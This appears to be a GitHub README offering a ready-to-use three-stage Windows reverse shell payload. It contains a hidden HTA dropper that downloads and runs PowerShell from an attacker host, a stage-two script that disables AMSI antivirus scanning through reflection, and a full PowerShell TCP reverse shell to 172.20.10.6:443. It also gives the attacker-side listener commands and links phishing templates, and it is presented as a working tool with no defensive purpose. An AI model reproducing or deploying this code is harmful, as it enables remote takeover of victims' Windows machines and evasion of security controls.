# reverseshell
A small 3-stage reverse shell payload for windows

Change the IP and PORT on all payloads and enjoy!😉

STAGE1.hta 

````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````
<!DOCTYPE html>
<html>
<head>
	<HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no"SYSMENU="no" CAPTION="no" />
	<script language="VBScript">
	Function var_func()
	Dim var_shell
	Set var_shell = CreateObject("Wscript.Shell")
	var_shell.run "powershell.exe iex (iwr http://172.20.10.6/stage2.ps1 -UseBasicParsing)", 0, true
	End Function
	var_func
	self.close
	</script>
</head>
<body>
</body>
</html>
````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````

STAGE2.ps1

````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````

$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
iex (iwr http://172.20.10.6/stage3.ps1 -UseBasicParsing)
````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````

STAGE3.ps1

````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````

$client = New-Object System.Net.Sockets.TCPClient('172.20.10.6',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()


````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````


CMD!!

1. sudo python3 -m http.server 80
2. sudo nc -nvlp 443



https://cyberchef.io/
https://github.com/ZeroPointSecurity/PhishingTemplates/tree/master


HAPPY HACKING!

